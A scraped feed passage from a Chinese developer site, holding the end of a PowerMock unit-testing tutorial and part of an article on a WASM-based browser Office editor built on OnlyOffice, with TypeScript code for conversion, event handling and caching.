    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">loadConfigurationFromRemote</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 模拟昂贵的初始化</span>
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"不应该在测试中执行"</span>);
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getConfig</span><span class="hljs-params">(String key)</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"value"</span>;
    }
}
</code></pre>
<p><strong>测试代码</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@RunWith(PowerMockRunner.class)</span>
<span class="hljs-meta">@PrepareForTest(ConfigurationLoader.class)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ConfigurationLoaderTest</span> {
    
    <span class="hljs-meta">@Test</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testSuppressStaticInitializer</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// 抑制静态代码块执行</span>
        PowerMockito.suppress(PowerMockito.method(ConfigurationLoader.class, <span class="hljs-string">"loadConfigurationFromRemote"</span>));
        
        <span class="hljs-comment">// 现在可以安全测试，静态代码块不会执行</span>
        assertNotNull(ConfigurationLoader.getConfig(<span class="hljs-string">"testkey"</span>));
    }
}
</code></pre>
<h2 data-id="heading-13">PowerMock最佳实践与注意事项</h2>
<h3 data-id="heading-14">谨慎使用PowerMock</h3>
<p>虽然PowerMock功能强大，但过度使用可能是代码设计问题的信号。<strong>以下是一些使用原则</strong>：</p>
<ul>
<li><strong>优先考虑重构</strong>：如果代码中大量使用PowerMock，应该考虑重构代码以提高可测试性。例如，将静态方法改为实例方法，通过依赖注入解耦等。</li>
<li><strong>仅用于遗留代码</strong>：在新项目中，优先通过良好设计避免使用PowerMock，仅在处理难以修改的遗留代码时大量使用。</li>
<li><strong>隔离使用</strong>：将使用PowerMock的测试类单独放置，防止影响其他测试的执行效率。</li>
</ul>
<h3 data-id="heading-15">性能优化建议</h3>
<p>PowerMock由于使用自定义类加载器和字节码操作，会对测试执行时间产生显著影响。以下是一些优化建议：</p>
<ul>
<li><strong>最小化@PrepareForTest</strong>：只将确实需要Mock的类放入注解中，减少字节码操作的范围。</li>
<li><strong>合理使用Mockito</strong>：对于常规Mock场景，仍然使用Mockito，仅在必要时使用PowerMock。</li>
<li><strong>避免过度Mock</strong>：不要Mock系统类或简单值对象，这会给测试带来不必要的复杂性。</li>
</ul>
<h3 data-id="heading-16">版本选择与兼容性</h3>
<p><strong>版本兼容性</strong>：PowerMock与Mockito、JUnit的版本兼容性非常重要。以下是推荐组合：</p>
<ul>
<li>PowerMock 2.x + Mockito 2.x + JUnit 4.12+</li>
<li>避免混合使用不兼容的版本</li>
</ul>
<p><strong>JUnit 5支持</strong>：截至目前，PowerMock不支持JUnit 5，这是选择测试框架时需要考虑的因素。</p>
<h3 data-id="heading-17">常见问题排查</h3>
<p><strong>类加载器冲突</strong>：使用<code>@PowerMockIgnore</code>注解排除冲突的包。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@PowerMockIgnore({"javax.management.*", "javax.net.ssl.*"})</span>
</code></pre>
<p><strong>版本冲突</strong>：确保所有Mock相关库的版本兼容。</p>
<p><strong>静态方法验证失败</strong>：记住每次验证静态方法调用时都要先调用<code>verifyStatic()</code>。</p>
<h2 data-id="heading-18">总结</h2>
<p>PowerMock解决了传统Mock框架无法处理的棘手问题。通过字节码操作技术，PowerMock能够Mock静态方法、final类、私有方法和构造函数等"不可Mock"的元素。</p>
<p><strong>核心价值</strong>：</p>
<ul>
<li>填补了Mockito的功能空白，完善了Java单元测试的工具链。</li>
<li>特别适用于处理遗留代码和第三方库的测试问题。</li>
<li>通过提高代码覆盖率来提升软件质量。</li>
</ul>
<p><strong>适用边界</strong>：</p>
<ul>
<li>不是所有场景都适合使用PowerMock，新项目应优先考虑良好的代码设计。</li>
<li>在测试性能和代码可维护性之间需要权衡。</li>
<li>建议将使用范围控制在确实必要的复杂场景中。</li>
</ul>
<p>希望本文能帮助你在实际项目中更好地使用PowerMock。如果你有任何问题或经验分享，欢迎在评论区留言交流！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[基于WASM的纯前端Office解决方案：在线编辑/导入导出/权限切换（已开源）]]></title>    <link>https://juejin.cn/post/7575425466904723519</link>    <guid>https://juejin.cn/post/7575425466904723519</guid>    <pubDate>2025-11-23T08:32:31.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575425466904723519" data-draft-id="7575425466904690751" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="基于WASM的纯前端Office解决方案：在线编辑/导入导出/权限切换（已开源）"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2025-11-23T08:32:31.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Electrolux"/> <meta itemprop="url" content="https://juejin.cn/user/3004311888208296"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            基于WASM的纯前端Office解决方案：在线编辑/导入导出/权限切换（已开源）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3004311888208296/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Electrolux
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T08:32:31.000Z" title="Sun Nov 23 2025 08:32:31 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    6
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">效果展示</h2>
<p>所有操作均在浏览器进行，先来看看最终效果：</p>
<p>🌐 <strong>在线演示</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fmvp-onlyoffice.vercel.app%2F" target="_blank" title="https://mvp-onlyoffice.vercel.app/" ref="nofollow noopener noreferrer">mvp-onlyoffice.vercel.app/</a></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cc97b2347465410184d7b237954a61bd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxlY3Ryb2x1eA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764491695&amp;x-signature=J3BA0nQbpFpxQGMHFE5DLw59lks%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-1">核心功能演示</h3>
<ul>
<li>✅ <strong>文档上传</strong>：支持本地文件直接上传</li>
<li>✅ <strong>实时编辑</strong>：流畅的文档编辑体验</li>
<li>✅ <strong>格式转换</strong>：基于WASM的文档格式转换</li>
<li>✅ <strong>导出保存</strong>：一键导出编辑后的文档</li>
<li>✅ <strong>模式切换</strong>：只读/可编辑模式自由切换</li>
<li>✅ <strong>多语言支持</strong>：中英文界面无缝切换</li>
</ul>
<h2 data-id="heading-2">技术架构</h2>
<h3 data-id="heading-3">核心技术栈</h3>
<ul>
<li><strong>React 19</strong> + <strong>Next.js 15</strong>：现代化前端框架</li>
<li><strong>OnlyOffice SDK</strong>：官方JavaScript SDK，提供文档编辑核心能力</li>
<li><strong>WebAssembly (x2t-wasm)</strong>：文档格式转换引擎</li>
<li><strong>TypeScript</strong>：类型安全的开发体验</li>
<li><strong>EventBus</strong>：事件驱动的架构设计</li>
<li><strong>IndexedDB</strong>：WASM文件缓存优化</li>
</ul>
<p>tip: 事实上不依赖于 react，你可以拿到 项目中的 src/onlyoffice-comp ,然后接入到任何系统中去，接入层可以参考 <code>src/app/excel/page.tsx</code>等应用层文件</p>
<h3 data-id="heading-4">架构流程图</h3>
<pre><code class="hljs language-scss" lang="scss">用户上传文档
    ↓
React组件层
    ↓
EditorManager (编辑器管理器)
    ↓
X2T Converter (WASM转换器)
    ↓
OnlyOffice SDK (文档编辑器)
    ↓
EventBus (事件总线)
    ↓
导出/保存文档
</code></pre>
<h2 data-id="heading-5">WASM文档转换核心流程</h2>
<h3 data-id="heading-6">转换流程图解</h3>
<pre><code class="hljs language-markdown" lang="markdown">用户选择文件
<span class="hljs-code">    ↓
浏览器读取文件
    ↓
WASM虚拟文件系统
    ↓
X2T引擎执行转换
    ↓
生成二进制数据 + 媒体资源
    ↓
OnlyOffice编辑器加载
</span></code></pre>
<h3 data-id="heading-7">核心代码实现</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// src/onlyoffice-comp/lib/x2t.ts</span>

<span class="hljs-comment">/**
 * X2T 工具类 - 负责文档转换功能
 */</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">X2TConverter</span> {
  <span class="hljs-keyword">private</span> <span class="hljs-attr">x2tModule</span>: <span class="hljs-title class_">EmscriptenModule</span> | <span class="hljs-literal">null</span> = <span class="hljs-literal">null</span>;
  
  <span class="hljs-comment">// 支持的文件类型映射</span>
  <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> <span class="hljs-attr">DOCUMENT_TYPE_MAP</span>: <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-title class_">DocumentType</span>&gt; = {
    <span class="hljs-attr">docx</span>: <span class="hljs-string">'word'</span>,
    <span class="hljs-attr">doc</span>: <span class="hljs-string">'word'</span>,
    <span class="hljs-attr">odt</span>: <span class="hljs-string">'word'</span>,
    <span class="hljs-attr">rtf</span>: <span class="hljs-string">'word'</span>,
    <span class="hljs-attr">txt</span>: <span class="hljs-string">'word'</span>,
    <span class="hljs-attr">xlsx</span>: <span class="hljs-string">'cell'</span>,
    <span class="hljs-attr">xls</span>: <span class="hljs-string">'cell'</span>,
    <span class="hljs-attr">ods</span>: <span class="hljs-string">'cell'</span>,
    <span class="hljs-attr">csv</span>: <span class="hljs-string">'cell'</span>,
    <span class="hljs-attr">pptx</span>: <span class="hljs-string">'slide'</span>,
    <span class="hljs-attr">ppt</span>: <span class="hljs-string">'slide'</span>,
    <span class="hljs-attr">odp</span>: <span class="hljs-string">'slide'</span>,
  };

  <span class="hljs-comment">/**
   * 转换文档格式
   */</span>
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">convertDocument</span>(<span class="hljs-attr">file</span>: <span class="hljs-title class_">File</span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">ConversionResult</span>&gt; {
    <span class="hljs-comment">// 初始化WASM模块</span>
    <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">ensureReady</span>();
    
    <span class="hljs-comment">// 写入虚拟文件系统</span>
    <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> file.<span class="hljs-title function_">arrayBuffer</span>();
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">x2tModule</span>!.<span class="hljs-property">FS</span>.<span class="hljs-title function_">writeFile</span>(<span class="hljs-string">'/working/origin'</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>(data));
    
    <span class="hljs-comment">// 执行C++编译的转换模块</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">executeConversion</span>(<span class="hljs-string">'/working/params.xml'</span>);
    
    <span class="hljs-comment">// 提取转换结果和媒体文件</span>
    <span class="hljs-keyword">return</span> {
      <span class="hljs-attr">bin</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">x2tModule</span>!.<span class="hljs-property">FS</span>.<span class="hljs-title function_">readFile</span>(<span class="hljs-string">'/working/output.bin'</span>),
      <span class="hljs-attr">media</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">collectMediaFiles</span>() <span class="hljs-comment">// 提取图片等资源</span>
    };
  }
}
</code></pre>
<h2 data-id="heading-8">编辑器管理器：Proxy模式的安全封装</h2>
<p>项目采用Proxy模式对OnlyOffice编辑器实例进行安全封装，提供统一的API接口：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// src/onlyoffice-comp/lib/editor-manager.ts</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">EditorManager</span> {
  <span class="hljs-keyword">private</span> <span class="hljs-attr">editor</span>: <span class="hljs-title class_">DocEditor</span> | <span class="hljs-literal">null</span> = <span class="hljs-literal">null</span>;
  
  <span class="hljs-comment">// 使用 Proxy 提供安全的访问接口</span>
  <span class="hljs-keyword">private</span> <span class="hljs-title function_">createProxy</span>(): <span class="hljs-title class_">DocEditor</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>({} <span class="hljs-keyword">as</span> <span class="hljs-title class_">DocEditor</span>, {
      <span class="hljs-attr">get</span>: <span class="hljs-function">(<span class="hljs-params">_target, prop</span>) =&gt;</span> {
        <span class="hljs-keyword">if</span> (prop === <span class="hljs-string">'destroyEditor'</span>) {
          <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">destroy</span>();
        }
        <span class="hljs-keyword">if</span> (prop === <span class="hljs-string">'sendCommand'</span>) {
          <span class="hljs-keyword">return</span> <span class="hljs-function">(<span class="hljs-params">params</span>) =&gt;</span> {
            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">editor</span>) {
              <span class="hljs-variable language_">this</span>.<span class="hljs-property">editor</span>.<span class="hljs-title function_">sendCommand</span>(params);
            }
          };
        }
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">editor</span> ? (<span class="hljs-variable language_">this</span>.<span class="hljs-property">editor</span> <span class="hljs-keyword">as</span> <span class="hljs-built_in">any</span>)[prop] : <span class="hljs-literal">undefined</span>;
      },
    });
  }
  
  <span class="hljs-comment">// 导出文档（事件驱动）</span>
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">export</span>(): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">SaveDocumentData</span>&gt; {
    <span class="hljs-keyword">const</span> editor = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">get</span>();
    <span class="hljs-keyword">if</span> (!editor) {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'Editor not available'</span>);
    }
    
    <span class="hljs-comment">// 触发保存</span>
    (editor <span class="hljs-keyword">as</span> <span class="hljs-built_in">any</span>).<span class="hljs-title function_">downloadAs</span>();
    
    <span class="hljs-comment">// 等待保存事件</span>
    <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> onlyofficeEventbus.<span class="hljs-title function_">waitFor</span>(
      <span class="hljs-variable constant_">ONLYOFFICE_EVENT_KEYS</span>.<span class="hljs-property">SAVE_DOCUMENT</span>, 
      <span class="hljs-number">10000</span>
    );
    
    <span class="hljs-keyword">return</span> result;
  }
}
</code></pre>
<h2 data-id="heading-9">事件驱动架构：EventBus解耦设计</h2>
<p>项目采用事件总线机制，实现组件间的松耦合通信：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// src/onlyoffice-comp/lib/eventbus.ts</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">EventBus</span> {
  <span class="hljs-keyword">private</span> <span class="hljs-attr">listeners</span>: <span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">EventKey</span>, <span class="hljs-title class_">Array</span>&lt;<span class="hljs-function">(<span class="hljs-params">data: <span class="hljs-built_in">any</span></span>) =&gt;</span> <span class="hljs-built_in">void</span>&gt;&gt; = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();
  
  <span class="hljs-comment">// 监听事件</span>
  on&lt;K <span class="hljs-keyword">extends</span> <span class="hljs-title class_">EventKey</span>&gt;(<span class="hljs-attr">key</span>: K, <span class="hljs-attr">callback</span>: <span class="hljs-function">(<span class="hljs-params">data: EventDataMap[K]</span>) =&gt;</span> <span class="hljs-built_in">void</span>): <span class="hljs-built_in">void</span> {
    <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">listeners</span>.<span class="hljs-title function_">has</span>(key)) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">listeners</span>.<span class="hljs-title function_">set</span>(key, []);
    }
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">listeners</span>.<span class="hljs-title function_">get</span>(key)!.<span class="hljs-title function_">push</span>(callback);
  }
  
  <span class="hljs-comment">// 等待事件触发（返回 Promise）</span>
  waitFor&lt;K <span class="hljs-keyword">extends</span> <span class="hljs-title class_">EventKey</span>&gt;(<span class="hljs-attr">key</span>: K, timeout?: <span class="hljs-built_in">number</span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">EventDataMap</span>[K]&gt; {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
      <span class="hljs-keyword">const</span> timeoutId = timeout
        ? <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
            <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">off</span>(key, handleEvent);
            <span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">`Event <span class="hljs-subst">${key}</span> timeout after <span class="hljs-subst">${timeout}</span>ms`</span>));
          }, timeout)
        : <span class="hljs-literal">null</span>;

      <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleEvent</span> = (<span class="hljs-params">data: EventDataMap[K]</span>) =&gt; {
        <span class="hljs-keyword">if</span> (timeoutId) <span class="hljs-built_in">clearTimeout</span>(timeoutId);
        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">off</span>(key, handleEvent);
        <span class="hljs-title function_">resolve</span>(data);
      };

      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">on</span>(key, handleEvent);
    });
  }
}
</code></pre>
<h3 data-id="heading-10">支持的事件类型</h3>
<ul>
<li><code>saveDocument</code> - 文档保存完成事件</li>
<li><code>documentReady</code> - 文档加载就绪事件</li>
<li><code>loadingChange</code> - 加载状态变化事件</li>
</ul>
<h2 data-id="heading-11">核心功能特性</h2>
<h3 data-id="heading-12">1. 国际化支持</h3>
<p>项目内置多语言支持，可自由切换中英文界面：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 切换语言</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleLanguageSwitch</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> newLang = currentLang === <span class="hljs-string">'zh'</span> ? <span class="hljs-string">'en'</span> : <span class="hljs-string">'zh'</span>;
  <span class="hljs-title function_">setCurrentLang</span>(newLang);
  
  <span class="hljs-comment">// 如果编辑器已存在，重新创建以应用新语言</span>
  <span class="hljs-keyword">if</span> (editorManager.<span class="hljs-title function_">exists</span>()) {
    <span class="hljs-keyword">await</span> <span class="hljs-title function_">handleView</span>(fileName, file);
  }
};
</code></pre>
<h3 data-id="heading-13">2. 导入导出功能</h3>
<p>完整的文档导入导出能力：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 导出文档</span>
<span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> editorManager.<span class="hljs-title function_">export</span>();
<span class="hljs-comment">// result 包含: { fileName, fileType, binData, media }</span>

<span class="hljs-comment">// 转换并下载</span>
<span class="hljs-keyword">const</span> buffer = <span class="hljs-keyword">await</span> <span class="hljs-title function_">convertBinToDocument</span>(
  result.<span class="hljs-property">binData</span>, 
  result.<span class="hljs-property">fileName</span>,
  <span class="hljs-variable constant_">FILE_TYPE</span>.<span class="hljs-property">XLSX</span>, 
  result.<span class="hljs-property">media</span>
);

<span class="hljs-keyword">const</span> blob = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Blob</span>([buffer.<span class="hljs-property">data</span>], {
  <span class="hljs-attr">type</span>: <span class="hljs-string">'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet'</span>
});
<span class="hljs-comment">// 执行下载操作</span>
</code></pre>
<h3 data-id="heading-14">3. 只读/可编辑模式切换</h3>
<p>灵活的权限控制，支持动态切换编辑模式：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 设置为只读模式</span>
<span class="hljs-keyword">await</span> editorManager.<span class="hljs-title function_">setReadOnly</span>(<span class="hljs-literal">true</span>);

<span class="hljs-comment">// 切换为可编辑模式</span>
<span class="hljs-keyword">await</span> editorManager.<span class="hljs-title function_">setReadOnly</span>(<span class="hljs-literal">false</span>);

<span class="hljs-comment">// 查询当前模式</span>
<span class="hljs-keyword">const</span> isReadOnly = editorManager.<span class="hljs-title function_">getReadOnly</span>();
</code></pre>
<p><strong>实现原理</strong>：</p>
<ul>
<li>从只读切换到可编辑：重新创建编辑器实例</li>
<li>从可编辑切换到只读：使用<code>processRightsChange</code>命令</li>
</ul>
<h3 data-id="heading-15">4. IndexedDB缓存优化</h3>
<p>使用IndexedDB缓存WASM文件，大幅提升二次加载速度：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 拦截 fetch，缓存 WASM 文件到 IndexedDB</span>
<span class="hljs-keyword">private</span> <span class="hljs-title function_">interceptFetch</span>(): <span class="hljs-built_in">void</span> {
  <span class="hljs-keyword">const</span> originalFetch = <span class="hljs-variable language_">window</span>.<span class="hljs-property">fetch</span>;
  
  <span class="hljs-variable language_">window</span>.<span class="hljs-property">fetch</span> = <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span>(<span class="hljs-params">input: RequestInfo | URL</span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">Response</span>&gt; {
    <span class="hljs-comment">// 先尝试从缓存读取</span>
    <span class="hljs-keyword">const</span> cached = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getCachedWasm</span>(url);
    <span class="hljs-keyword">if</span> (cached) {
      <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Response</span>(cached, {
        <span class="hljs-attr">headers</span>: { <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/wasm'</span> }
      });
    }
    
    <span class="hljs-comment">// 缓存未命中，从网络加载并缓存</span>
    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">originalFetch</span>(input);
    <span class="hljs-keyword">const</span> arrayBuffer = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">arrayBuffer</span>();
    <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">cacheWasm</span>(url, arrayBuffer);
    
    <span class="hljs-keyword">return</span> response;
  };
}
</code></pre>
<h2 data-id="heading-16">使用示例</h2>
<h3 data-id="heading-17">基本使用</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { createEditorView } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/onlyoffice-comp/lib/x2t'</span>;
<span class="hljs-keyword">import</span> { editorManager } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/onlyoffice-comp/lib/editor-manager'</span>;

<span class="hljs-comment">// 创建编辑器视图</span>
<span class="hljs-keyword">await</span> <span class="hljs-title function_">createEditorView</span>({
  <span class="hljs-attr">file</span>: fileObject,        <span class="hljs-comment">// File 对象（可选）</span>
  <span class="hljs-attr">fileName</span>: <span class="hljs-string">'document.xlsx'</span>, <span class="hljs-comment">// 文件名</span>
